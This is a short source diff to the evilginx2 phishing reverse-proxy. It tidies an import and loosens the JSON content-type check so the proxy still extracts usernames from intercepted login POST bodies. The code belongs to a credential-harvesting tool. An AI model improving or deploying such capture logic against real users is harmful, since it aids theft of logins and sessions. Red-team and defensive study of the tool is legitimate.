@@ -34,7 +34,7 @@ import (
 	"github.com/elazarl/goproxy"
 	"github.com/fatih/color"
 	"github.com/inconshreveable/go-vhost"
-	"github.com/mwitkow/go-http-dialer"
+	http_dialer "github.com/mwitkow/go-http-dialer"
 
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
@@ -433,7 +433,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						log.Debug("POST body = %s", body)
 
 						contentType := req.Header.Get("Content-type")
-						if contentType == "application/json" {
+						if strings.Contains(contentType, "application/json") {
 
 							if pl.username.tp == "json" {
 								um := pl.username.search.FindStringSubmatch(string(body))
